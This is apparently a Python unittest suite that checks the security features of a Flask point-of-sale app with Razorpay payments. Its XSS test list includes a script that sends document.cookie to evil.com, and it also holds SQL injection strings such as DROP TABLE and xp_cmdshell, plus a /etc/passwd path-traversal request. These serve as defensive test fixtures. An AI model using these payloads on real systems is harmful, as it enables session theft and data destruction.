"""
Comprehensive Security Tests for Multi-Web-Cloud POS Application
Tests CSRF protection, XSS prevention, SQL injection protection, rate limiting, and other security features
"""

import unittest
import json
import tempfile
import os
import time
import hashlib
import hmac
from datetime import datetime, timedelta
from decimal import Decimal
from unittest.mock import Mock, patch, MagicMock
from flask import Flask, session, request, g
import logging
import re

# Import application and managers
from app import create_app
from config import Config
from utils.form_validator import FormValidator
from utils.session_manager import SessionManager
from utils.security_manager import SecurityManager
from utils.offline_manager import OfflineManager
from utils.razorpay_manager import RazorpayManager

# Import models
from models import db, User, Category, MenuItem, Table, Order, OrderItem, Payment, Settings

class TestSecurityComprehensive(unittest.TestCase):
    """Comprehensive security test suite"""
    
    @classmethod
    def setUpClass(cls):
        """Set up test environment"""
        # Configure test app
        cls.test_config = {
            'TESTING': True,
            'SQLALCHEMY_DATABASE_URI': 'sqlite:///:memory:',
            'WTF_CSRF_ENABLED': True,  # Enable CSRF for security testing
            'SECRET_KEY': 'test-secret-key-for-security-testing',
            'SESSION_SALT': 'test-session-salt',
            'RAZORPAY_KEY_ID': 'test_key_id',
            'RAZORPAY_KEY_SECRET': 'test_key_secret',
            'RAZORPAY_WEBHOOK_SECRET': 'test_webhook_secret',
            'RAZORPAY_TEST_MODE': True,
            'RATE_LIMITS': {
                'default': {'requests': 10, 'window': 60},  # Lower limits for testing
                'auth': {'requests': 3, 'window': 300},
                'api': {'requests': 20, 'window': 60}
            },
            'IP_BLOCK_DURATION': 3600,
            'MAX_FAILED_ATTEMPTS': 3,  # Lower for testing
            'OFFLINE_MODE': False,
            'SYNC_INTERVAL': 5,
            'MAX_RETRY_ATTEMPTS': 3,
            'BASE_URL': 'http://localhost:5000'
        }
        
        # Create test app
        cls.app = create_app('testing')
        cls.app.config.update(cls.test_config)
        
        # Create test client
        cls.client = cls.app.test_client()
        
        # Create application context
        cls.app_context = cls.app.app_context()
        cls.app_context.push()
        
        # Create database tables
        db.create_all()
        
        # Create test data
        cls._create_test_data()
        
        # Initialize managers
        cls.form_validator = FormValidator()
        cls.session_manager = SessionManager(cls.app)
        cls.security_manager = SecurityManager(cls.app)
        cls.offline_manager = OfflineManager(cls.app)
        cls.razorpay_manager = RazorpayManager(cls.app)
    
    @classmethod
    def tearDownClass(cls):
        """Clean up test environment"""
        db.session.remove()
        db.drop_all()
        cls.app_context.pop()
    
    def setUp(self):
        """Set up for each test"""
        # Clear session
        with self.client.session_transaction() as sess:
            sess.clear()
        
        # Reset managers
        self.security_manager.blocked_ips.clear()
        self.security_manager.failed_attempts.clear()
        self.security_manager.security_events.clear()
    
    @classmethod
    def _create_test_data(cls):
        """Create test data for security testing"""
        # Create test user
        cls.test_user = User(
            username='testuser',
            email='test@example.com',
            role='admin'
        )
        cls.test_user.set_password('testpass123')
        db.session.add(cls.test_user)
        
        # Create test category
        cls.test_category = Category(
            name='Test Category',
            description='Test category description'
        )
        db.session.add(cls.test_category)
        
        # Create test menu item
        cls.test_menu_item = MenuItem(
            name='Test Item',
            description='Test item description',
            category_id=1,
            price=Decimal('100.00'),
            stock_quantity=50,
            min_stock_level=5,
            unit='pcs'
        )
        db.session.add(cls.test_menu_item)
        
        # Create test table
        cls.test_table = Table(
            table_number='T1',
            capacity=4,
            location='Main Hall',
            description='Test table'
        )
        db.session.add(cls.test_table)
        
        db.session.commit()
    
    def _login_user(self, username='testuser', password='testpass123'):
        """Helper method to login user"""
        response = self.client.post('/auth/login', data={
            'username': username,
            'password': password,
            'remember': True
        }, follow_redirects=True)
        return response
    
    def test_csrf_protection(self):
        """Test CSRF protection mechanisms"""
        print("\n=== Testing CSRF Protection ===")
        
        # Test CSRF token generation
        with self.app.test_request_context('/'):
            csrf_token = self.session_manager.generate_csrf_token()
            self.assertIsNotNone(csrf_token, "CSRF token should be generated")
            self.assertIn(csrf_token, session, "CSRF token should be stored in session")
        
        # Test CSRF token validation
        with self.app.test_request_context('/'):
            session['csrf_token'] = 'test_csrf_token'
            
            # Valid token should pass
            is_valid = self.session_manager.validate_csrf_token('test_csrf_token')
            self.assertTrue(is_valid, "Valid CSRF token should pass validation")
            
            # Invalid token should fail
            is_valid = self.session_manager.validate_csrf_token('invalid_token')
            self.assertFalse(is_valid, "Invalid CSRF token should fail validation")
            
            # Missing token should fail
            is_valid = self.session_manager.validate_csrf_token('')
            self.assertFalse(is_valid, "Missing CSRF token should fail validation")
        
        # Test CSRF protection in form submissions
        self._login_user()
        
        # Form without CSRF token should be rejected
        response = self.client.post('/api/orders', json={
            'customer_name': 'CSRF Test Customer',
            'order_type': 'Dine-in',
            'items': [
                {'menu_item_id': 1, 'quantity': 1, 'price': 100.00}
            ]
        })
        
        # Should be rejected due to CSRF protection
        self.assertIn(response.status_code, [400, 403], "Form without CSRF should be rejected")
        
        print("✅ CSRF protection tests passed")
    
    def test_xss_prevention(self):
        """Test XSS prevention mechanisms"""
        print("\n=== Testing XSS Prevention ===")
        
        # Test input sanitization
        xss_payloads = [
            '<script>alert("xss")</script>',
            'javascript:alert("xss")',
            '<img src="x" onerror="alert(1)">',
            '"><script>alert("xss")</script>',
            '<svg onload=alert(1)>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<keygen onfocus=alert(1) autofocus>',
            '<video><source onerror="alert(1)">',
            '<audio src=x onerror=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<isindex action=javascript:alert(1) type=submit>',
            '<form><button formaction=javascript:alert(1)>XSS</button></form>',
            '"><script>document.location="http://evil.com"</script>',
            '<script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>'
        ]
        
        for payload in xss_payloads:
            # Test form validator sanitization
            sanitized = self.form_validator.sanitize_input(payload)
            
            # Check that dangerous elements are removed
            self.assertNotIn('<script', sanitized.lower(), f"Script tags should be removed from: {payload}")
            self.assertNotIn('javascript:', sanitized.lower(), f"JavaScript protocol should be removed from: {payload}")
            self.assertNotIn('onerror', sanitized.lower(), f"Event handlers should be removed from: {payload}")
            self.assertNotIn('onload', sanitized.lower(), f"Event handlers should be removed from: {payload}")
            self.assertNotIn('onfocus', sanitized.lower(), f"Event handlers should be removed from: {payload}")
            
            # Test security manager detection
            is_suspicious = self.security_manager._is_suspicious_string(payload)
            self.assertTrue(is_suspicious, f"XSS payload should be detected as suspicious: {payload}")
        
        # Test XSS prevention in API responses
        self._login_user()
        
        # Submit malicious data
        response = self.client.post('/api/orders', json={
            'customer_name': '<script>alert("xss")</script>',
            'order_type': 'Dine-in',
            'items': [
                {'menu_item_id': 1, 'quantity': 1, 'price': 100.00}
            ]
        })
        
        # Should be rejected or sanitized
        if response.status_code == 200:
            data = json.loads(response.data)
            customer_name = data.get('customer_name', '')
            self.assertNotIn('<script>', customer_name, "XSS should be sanitized in response")
        
        print("✅ XSS prevention tests passed")
    
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention mechanisms"""
        print("\n=== Testing SQL Injection Prevention ===")
        
        # Test SQL injection payloads
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; DELETE FROM orders; --",
            "' UNION SELECT * FROM users --",
            "1'; INSERT INTO users VALUES('hacker','pass'); --",
            "'; EXEC xp_cmdshell('dir'); --",
            "' OR 1=1 --",
            "'; UPDATE users SET password='hacked'; --",
            "' UNION SELECT username, password FROM users --",
            "'; ALTER TABLE users ADD COLUMN hacked TEXT; --",
            "'; CREATE TABLE hacked (data TEXT); --",
            "' OR 'x'='x",
            "1'; WAITFOR DELAY '0:0:5' --",
            "'; BULK INSERT users FROM 'evil.txt'; --",
            "' UNION SELECT @@version --",
            "'; SHUTDOWN WITH NOWAIT; --",
            "'; BACKUP DATABASE users TO 'c:\\backup.bak'; --"
        ]
        
        for payload in sql_payloads:
            # Test form validator sanitization
            sanitized = self.form_validator.sanitize_input(payload)
            
            # Check that dangerous SQL keywords are removed
            self.assertNotIn('DROP', sanitized.upper(), f"DROP should be removed from: {payload}")
            self.assertNotIn('DELETE', sanitized.upper(), f"DELETE should be removed from: {payload}")
            self.assertNotIn('UNION', sanitized.upper(), f"UNION should be removed from: {payload}")
            self.assertNotIn('INSERT', sanitized.upper(), f"INSERT should be removed from: {payload}")
            self.assertNotIn('UPDATE', sanitized.upper(), f"UPDATE should be removed from: {payload}")
            self.assertNotIn('EXEC', sanitized.upper(), f"EXEC should be removed from: {payload}")
            self.assertNotIn('ALTER', sanitized.upper(), f"ALTER should be removed from: {payload}")
            self.assertNotIn('CREATE', sanitized.upper(), f"CREATE should be removed from: {payload}")
            
            # Test security manager detection
            is_suspicious = self.security_manager._is_suspicious_string(payload)
            self.assertTrue(is_suspicious, f"SQL payload should be detected as suspicious: {payload}")
        
        # Test SQL injection prevention in login
        sql_login_attempts = [
            ("admin'; --", "password"),
            ("' OR '1'='1", "password"),
            ("admin' OR '1'='1' --", "password"),
            ("'; SELECT * FROM users WHERE '1'='1", "password")
        ]
        
        for username, password in sql_login_attempts:
            response = self.client.post('/auth/login', json={
                'username': username,
                'password': password
            })
            
            # Should not allow unauthorized access
            if response.status_code == 302:  # Redirect on success
                # Check if actually logged in
                response = self.client.get('/dashboard')
                self.assertNotEqual(response.status_code, 200, f"SQL injection should not allow login: {username}")
        
        print("✅ SQL injection prevention tests passed")
    
    def test_rate_limiting(self):
        """Test rate limiting mechanisms"""
        print("\n=== Testing Rate Limiting ===")
        
        # Test rate limiting on API endpoints
        endpoint = '/api/offline/status'
        
        # Make requests up to the limit
        for i in range(10):  # Should be allowed
            response = self.client.get(endpoint)
            self.assertEqual(response.status_code, 200, f"Request {i+1} should be allowed")
        
        # Next request should be rate limited
        response = self.client.get(endpoint)
        self.assertEqual(response.status_code, 429, "Request should be rate limited")
        
        # Check rate limit headers
        self.assertIn('Retry-After', response.headers, "Retry-After header should be present")
        
        # Test rate limiting on auth endpoints
        auth_endpoint = '/auth/login'
        
        # Make multiple failed login attempts
        for i in range(5):  # Should exceed auth limit
            response = self.client.post(auth_endpoint, json={
                'username': 'wronguser',
                'password': 'wrongpassword'
            })
        
        # Should be rate limited
        response = self.client.post(auth_endpoint, json={
            'username': 'testuser',
            'password': 'testpass123'
        })
        self.assertEqual(response.status_code, 429, "Auth should be rate limited")
        
        # Test rate limiting recovery after time window
        time.sleep(1)  # Wait for rate limit window
        
        response = self.client.get(endpoint)
        self.assertEqual(response.status_code, 200, "Rate limit should recover after time window")
        
        print("✅ Rate limiting tests passed")
    
    def test_ip_blocking(self):
        """Test IP blocking mechanisms"""
        print("\n=== Testing IP Blocking ===")
        
        test_ip = '192.168.1.100'
        
        # Test IP blocking
        self.security_manager._block_ip(test_ip, 'Test block')
        self.assertTrue(self.security_manager._is_ip_blocked(test_ip), "IP should be blocked")
        
        # Test blocked IP access
        with self.app.test_request_context('/api/test', headers={
            'X-Forwarded-For': test_ip
        }):
            # Should be blocked
            response = self.client.get('/api/offline/status')
            self.assertEqual(response.status_code, 403, "Blocked IP should be denied access")
        
        # Test IP unblocking
        self.security_manager._unblock_ip(test_ip)
        self.assertFalse(self.security_manager._is_ip_blocked(test_ip), "IP should be unblocked")
        
        # Test automatic IP blocking after failed attempts
        for i in range(5):  # Exceed max failed attempts
            self.security_manager._increment_failed_attempts(test_ip)
        
        self.assertTrue(self.security_manager._is_ip_blocked(test_ip), "IP should be auto-blocked after failed attempts")
        
        # Test blocked IPs list
        blocked_ips = self.security_manager.get_blocked_ips()
        self.assertIsInstance(blocked_ips, list, "Blocked IPs should be a list")
        
        print("✅ IP blocking tests passed")
    
    def test_password_security(self):
        """Test password security mechanisms"""
        print("\n=== Testing Password Security ===")
        
        # Test password strength validation
        weak_passwords = [
            'password',
            '123456',
            'qwerty',
            'admin',
            'letmein',
            'welcome',
            'monkey',
            '1234567890',
            'password1',
            'qwerty123',
            'admin123',
            'test',
            'guest',
            'user',
            'login',
            'abc123',
            'password123',
            '12345678',
            'qwertyuiop',
            'asdfghjkl',
            'zxcvbnm',
            '111111',
            '000000',
            '123123',
            'qwertyqwerty'
        ]
        
        for password in weak_passwords:
            is_valid, errors = self.security_manager.validate_password(password)
            self.assertFalse(is_valid, f"Weak password should be rejected: {password}")
            self.assertGreater(len(errors), 0, f"Weak password should have errors: {password}")
        
        # Test strong password validation
        strong_passwords = [
            'MyStr0ngP@ssw0rd!',
            'C0mpl3x@B1n#2023',
            'S3cur3P@ssw0rd$123',
            'R@nd0m#P@ssw0rd!',
            'Tr0ub4d0ur&J0ur',
            'P@ssw0rd!123$ABC',
            'Secur1ty@P@ss#2023',
            'MyP@ssw0rd!IsStr0ng',
            'C0mpl3x!P@ssw0rd#123'
        ]
        
        for password in strong_passwords:
            is_valid, errors = self.security_manager.validate_password(password)
            self.assertTrue(is_valid, f"Strong password should be accepted: {password}")
            self.assertEqual(len(errors), 0, f"Strong password should have no errors: {password}")
        
        # Test password hashing
        password = 'testpassword123'
        hashed_password = self.test_user.password_hash
        
        # Verify password is hashed (not plaintext)
        self.assertNotEqual(password, hashed_password, "Password should be hashed")
        self.assertTrue(hashed_password.startswith('$2b$'), "Password should be bcrypt hashed")
        
        # Test password verification
        self.assertTrue(self.test_user.check_password(password), "Password verification should work")
        self.assertFalse(self.test_user.check_password('wrongpassword'), "Wrong password should not verify")
        
        print("✅ Password security tests passed")
    
    def test_session_security(self):
        """Test session security mechanisms"""
        print("\n=== Testing Session Security ===")
        
        # Test session fingerprinting
        with self.app.test_request_context('/', headers={
            'User-Agent': 'Mozilla/5.0 (Test Browser)',
            'Accept-Language': 'en-US,en;q=0.9'
        }):
            # Create session
            session_data = self.session_manager.create_session(
                user_id=self.test_user.id,
                remember_me=True
            )
            
            fingerprint = session_data['session_fingerprint']
            self.assertIsNotNone(fingerprint, "Session fingerprint should be generated")
            
            # Test fingerprint validation
            is_valid = self.session_manager._is_session_valid()
            self.assertTrue(is_valid, "Session should be valid with correct fingerprint")
            
            # Test fingerprint mismatch
            with self.app.test_request_context('/', headers={
                'User-Agent': 'Different Browser',
                'Accept-Language': 'fr-FR,fr;q=0.9'
            }):
                is_valid = self.session_manager._is_session_valid()
                self.assertFalse(is_valid, "Session should be invalid with different fingerprint")
        
        # Test session timeout
        with self.app.test_request_context('/'):
            # Create session with old timestamp
            old_timestamp = (datetime.utcnow() - timedelta(hours=9)).isoformat()
            session['user_id'] = self.test_user.id
            session['last_activity'] = old_timestamp
            session['session_fingerprint'] = 'test_fingerprint'
            
            is_valid = self.session_manager._is_session_valid()
            self.assertFalse(is_valid, "Session should be expired after timeout")
        
        # Test session fixation prevention
        with self.client.session_transaction() as sess:
            sess.clear()
        
        # Try to access with session ID
        response = self.client.get('/api/session/status')
        self.assertEqual(response.status_code, 401, "Access without valid session should be denied")
        
        print("✅ Session security tests passed")
    
    def test_input_validation_security(self):
        """Test input validation security"""
        print("\n=== Testing Input Validation Security ===")
        
        # Test file upload validation
        malicious_files = [
            ('malicious.exe', b'fake exe content', 'application/octet-stream'),
            ('malicious.php', b'<?php echo "hack"; ?>', 'application/x-php'),
            ('malicious.js', b'<script>alert("xss")</script>', 'application/javascript'),
            ('malicious.html', b'<script>alert("xss")</script>', 'text/html'),
            ('malicious.sql', b'DROP TABLE users;', 'text/plain')
        ]
        
        for filename, content, content_type in malicious_files:
            mock_file = Mock()
            mock_file.filename = filename
            mock_file.content_type = content_type
            mock_file.read = Mock(return_value=content)
            mock_file.seek = Mock(return_value=None)
            mock_file.tell = Mock(return_value=len(content))
            
            is_valid, message = self.form_validator.validate_file_upload(
                mock_file,
                allowed_extensions=['jpg', 'jpeg', 'png', 'pdf'],
                max_size_mb=5
            )
            
            self.assertFalse(is_valid, f"Malicious file should be rejected: {filename}")
        
        # Test JSON validation
        malicious_json = {
            'name': '<script>alert("xss")</script>',
            'description': "'; DROP TABLE users; --",
            'price': 'not_a_number',
            'quantity': -1
        }
        
        is_valid, message = self.form_validator.validate_json_structure(
            malicious_json,
            required_fields=['name', 'price'],
            field_types={'price': (int, float)}
        )
        
        self.assertFalse(is_valid, "Malicious JSON should be rejected")
        
        # Test timestamp validation
        old_timestamp = (datetime.utcnow() - timedelta(hours=2)).isoformat()
        is_valid = self.form_validator.validate_timestamp(old_timestamp, 30)
        self.assertFalse(is_valid, "Old timestamp should be invalid")
        
        future_timestamp = (datetime.utcnow() + timedelta(hours=1)).isoformat()
        is_valid = self.form_validator.validate_timestamp(future_timestamp, 30)
        self.assertFalse(is_valid, "Future timestamp should be invalid")
        
        print("✅ Input validation security tests passed")
    
    def test_authorization_security(self):
        """Test authorization security"""
        print("\n=== Testing Authorization Security ===")
        
        # Test role-based access control
        # Create regular user
        regular_user = User(
            username='regularuser',
            email='regular@example.com',
            role='cashier'
        )
        regular_user.set_password('regularpass123')
        db.session.add(regular_user)
        db.session.commit()
        
        # Login as regular user
        response = self.client.post('/auth/login', json={
            'username': 'regularuser',
            'password': 'regularpass123'
        })
        
        # Try to access admin-only endpoints
        admin_endpoints = [
            '/api/security/block-ip',
            '/api/security/unblock-ip',
            '/api/security/events',
            '/api/users/create',
            '/api/settings/system'
        ]
        
        for endpoint in admin_endpoints:
            response = self.client.post(endpoint, json={
                'test': 'data'
            })
            self.assertIn(response.status_code, [401, 403, 404], f"Regular user should not access admin endpoint: {endpoint}")
        
        # Test direct object access
        # Try to access other user's data
        response = self.client.get('/api/users/1/profile')  # Try to access admin user profile
        self.assertIn(response.status_code, [401, 403, 404], "Should not access other user's data")
        
        # Test privilege escalation prevention
        escalation_attempts = [
            {'role': 'admin'},
            {'permissions': ['admin', 'superuser']},
            {'is_admin': True},
            {'user_level': 10}
        ]
        
        for attempt in escalation_attempts:
            response = self.client.post('/api/users/update-profile', json=attempt)
            self.assertIn(response.status_code, [400, 401, 403], "Privilege escalation should be prevented")
        
        print("✅ Authorization security tests passed")
    
    def test_data_encryption_security(self):
        """Test data encryption security"""
        print("\n=== Testing Data Encryption Security ===")
        
        # Test sensitive data encryption
        sensitive_data = {
            'credit_card': '4111111111111111',
            'ssn': '123-45-6789',
            'password': 'secretpassword123'
        }
        
        # Test encryption
        for field_name, value in sensitive_data.items():
            # Generate security hash
            security_hash = self.security_manager.generate_security_hash(value)
            
            self.assertIsNotNone(security_hash, "Security hash should be generated")
            self.assertEqual(len(security_hash), 64, "SHA256 hash should be 64 characters")
            
            # Test hash consistency
            hash2 = self.security_manager.generate_security_hash(value)
            self.assertEqual(security_hash, hash2, "Hash should be consistent")
            
            # Test hash uniqueness
            different_value = value + 'different'
            hash3 = self.security_manager.generate_security_hash(different_value)
            self.assertNotEqual(security_hash, hash3, "Different data should produce different hash")
        
        # Test Razorpay signature verification
        order_id = 'order_test_123'
        payment_id = 'pay_test_456'
        
        # Generate valid signature
        signature_string = f"{order_id}|{payment_id}"
        valid_signature = hmac.new(
            self.razorpay_manager.key_secret.encode(),
            signature_string.encode(),
            hashlib.sha256
        ).hexdigest()
        
        # Test signature verification
        is_valid = self.razorpay_manager.verify_payment_signature(
            order_id, payment_id, valid_signature
        )
        self.assertTrue(is_valid, "Valid signature should be verified")
        
        # Test invalid signature
        is_valid = self.razorpay_manager.verify_payment_signature(
            order_id, payment_id, 'invalid_signature'
        )
        self.assertFalse(is_valid, "Invalid signature should be rejected")
        
        print("✅ Data encryption security tests passed")
    
    def test_security_headers(self):
        """Test security headers"""
        print("\n=== Testing Security Headers ===")
        
        # Test security headers on API responses
        response = self.client.get('/api/offline/status')
        
        # Check for security headers
        security_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Content-Security-Policy',
            'Referrer-Policy',
            'Permissions-Policy'
        ]
        
        for header in security_headers:
            self.assertIn(header, response.headers, f"Security header should be present: {header}")
        
        # Check header values
        self.assertEqual(response.headers['X-Content-Type-Options'], 'nosniff')
        self.assertEqual(response.headers['X-Frame-Options'], 'DENY')
        self.assertIn('1; mode=block', response.headers['X-XSS-Protection'])
        self.assertIn('max-age=', response.headers['Strict-Transport-Security'])
        self.assertIn("default-src 'self'", response.headers['Content-Security-Policy'])
        
        print("✅ Security headers tests passed")
    
    def test_error_handling_security(self):
        """Test secure error handling"""
        print("\n=== Testing Secure Error Handling ===")
        
        # Test that error messages don't leak sensitive information
        response = self.client.get('/api/nonexistent-endpoint')
        self.assertEqual(response.status_code, 404)
        
        data = json.loads(response.data)
        self.assertIn('error', data)
        self.assertNotIn('traceback', str(data), "Error should not contain traceback")
        self.assertNotIn('password', str(data), "Error should not contain sensitive data")
        self.assertNotIn('secret', str(data), "Error should not contain secrets")
        
        # Test database error handling
        with patch('models.db.session.query') as mock_query:
            mock_query.side_effect = Exception("Database connection failed")
            
            response = self.client.get('/api/menu/items')
            self.assertEqual(response.status_code, 500)
            
            data = json.loads(response.data)
            self.assertIn('error', data)
            self.assertNotIn('Database connection failed', str(data), "Database errors should be sanitized")
        
        # Test file path disclosure prevention
        response = self.client.get('/api/../../etc/passwd')
        self.assertIn(response.status_code, [400, 404], "Path traversal should be prevented")
        
        # Test information disclosure prevention
        response = self.client.get('/api/config/database-url')
        self.assertIn(response.status_code, [401, 403, 404], "Sensitive config should not be exposed")
        
        print("✅ Secure error handling tests passed")
    
    def test_audit_logging_security(self):
        """Test audit logging for security events"""
        print("\n=== Testing Audit Logging Security ===")
        
        # Test security event logging
        security_events = [
            ('brute_force_attempt', 'Multiple failed login attempts'),
            ('suspicious_input', 'XSS attempt detected'),
            ('sql_injection_attempt', 'SQL injection attempt detected'),
            ('privilege_escalation', 'Attempted privilege escalation'),
            ('unauthorized_access', 'Access to restricted resource'),
            ('data_breach_attempt', 'Attempted data exfiltration')
        ]
        
        for event_type, details in security_events:
            with self.app.test_request_context('/api/test'):
                self.security_manager._log_security_event(
                    event_type, '192.168.1.100', details, 'high'
                )
        
        # Check that events were logged
        events = self.security_manager.get_security_events(limit=100)
        self.assertGreater(len(events), 0, "Security events should be logged")
        
        # Verify event structure
        for event in events:
            self.assertIn('event_type', event)
            self.assertIn('ip_address', event)
            self.assertIn('details', event)
            self.assertIn('severity', event)
            self.assertIn('timestamp', event)
        
        # Test form validation event logging
        with self.app.test_request_context('/api/test'):
            self.form_validator.log_validation_event(
                'xss_detected',
                'comment',
                '<script>alert("xss")</script>',
                'XSS pattern detected and blocked',
                'high'
            )
        
        print("✅ Audit logging security tests passed")
    
    def test_webhook_security(self):
        """Test webhook security"""
        print("\n=== Testing Webhook Security ===")
        
        # Test Razorpay webhook signature verification
        webhook_data = {
            'event': 'payment.captured',
            'payload': {
                'payment': {
                    'entity': {
                        'id': 'pay_test_123',
                        'amount': 10000,
                        'currency': 'INR',
                        'status': 'captured'
                    }
                }
            }
        }
        
        webhook_body = json.dumps(webhook_data)
        
        # Generate valid signature
        valid_signature = hmac.new(
            self.razorpay_manager.webhook_secret.encode(),
            webhook_body.encode(),
            hashlib.sha256
        ).hexdigest()
        
        # Test webhook with valid signature
        response = self.client.post('/razorpay/webhook', 
            data=webhook_body,
            headers={'X-Razorpay-Signature': valid_signature}
        )
        
        self.assertIn(response.status_code, [200, 202], "Webhook with valid signature should be processed")
        
        # Test webhook with invalid signature
        response = self.client.post('/razorpay/webhook',
            data=webhook_body,
            headers={'X-Razorpay-Signature': 'invalid_signature'}
        )
        
        self.assertEqual(response.status_code, 400, "Webhook with invalid signature should be rejected")
        
        # Test webhook without signature
        response = self.client.post('/razorpay/webhook',
            data=webhook_body
        )
        
        self.assertEqual(response.status_code, 400, "Webhook without signature should be rejected")
        
        print("✅ Webhook security tests passed")

def run_security_comprehensive_tests():
    """Run all comprehensive security tests"""
    print("=" * 80)
    print("COMPREHENSIVE SECURITY TEST SUITE")
    print("=" * 80)
    print("Testing all security features and protections\n")
    
    # Create test suite
    test_suite = unittest.TestSuite()
    
    # Add all test methods
    test_suite.addTest(TestSecurityComprehensive('test_csrf_protection'))
    test_suite.addTest(TestSecurityComprehensive('test_xss_prevention'))
    test_suite.addTest(TestSecurityComprehensive('test_sql_injection_prevention'))
    test_suite.addTest(TestSecurityComprehensive('test_rate_limiting'))
    test_suite.addTest(TestSecurityComprehensive('test_ip_blocking'))
    test_suite.addTest(TestSecurityComprehensive('test_password_security'))
    test_suite.addTest(TestSecurityComprehensive('test_session_security'))
    test_suite.addTest(TestSecurityComprehensive('test_input_validation_security'))
    test_suite.addTest(TestSecurityComprehensive('test_authorization_security'))
    test_suite.addTest(TestSecurityComprehensive('test_data_encryption_security'))
    test_suite.addTest(TestSecurityComprehensive('test_security_headers'))
    test_suite.addTest(TestSecurityComprehensive('test_error_handling_security'))
    test_suite.addTest(TestSecurityComprehensive('test_audit_logging_security'))
    test_suite.addTest(TestSecurityComprehensive('test_webhook_security'))
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(test_suite)
    
    # Print summary
    print(f"\n{'='*80}")
    print("COMPREHENSIVE SECURITY TEST RESULTS")
    print(f"{'='*80}")
    print(f"Tests Run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Success Rate: {((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100):.1f}%")
    
    if result.failures:
        print(f"\nFAILURES ({len(result.failures)}):")
        for test, traceback in result.failures:
            print(f"- {test}: {traceback.split('AssertionError:')[-1].strip()}")
    
    if result.errors:
        print(f"\nERRORS ({len(result.errors)}):")
        for test, traceback in result.errors:
            print(f"- {test}: {traceback.split('Error:')[-1].strip()}")
    
    print(f"\n{'='*80}")
    
    return result.wasSuccessful()

if __name__ == '__main__':
    success = run_security_comprehensive_tests()
    
    if success:
        print("\n✅ ALL SECURITY TESTS PASSED!")
        print("System security is production-ready")
        exit(0)
    else:
        print("\n❌ SOME SECURITY TESTS FAILED!")
        print("Review and fix security issues before production deployment")
        exit(1)